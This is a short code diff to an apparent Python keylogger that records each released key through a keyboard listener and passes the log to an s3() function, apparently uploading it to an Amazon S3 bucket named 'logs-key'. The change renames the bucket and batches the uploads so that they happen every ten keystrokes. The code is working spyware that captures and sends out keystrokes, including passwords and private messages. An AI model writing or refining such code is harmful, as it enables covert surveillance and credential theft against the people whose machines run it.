@@ -4,7 +4,8 @@ import boto3
 import os
 
 
-nameBucket = 'log-key'
+nameBucket = 'logs-key'
+count = 1
 
 
 def log(text):
@@ -35,8 +36,14 @@ def press(key):
         key = '\n'
     if key == "Key.shift":
         key = ''
+    
     log(key)
-    s3()
+
+    global count
+    count += 1
+    if count >= 10:
+        count = 0
+        s3()
 
 
 with Listener(on_release=press) as listener:
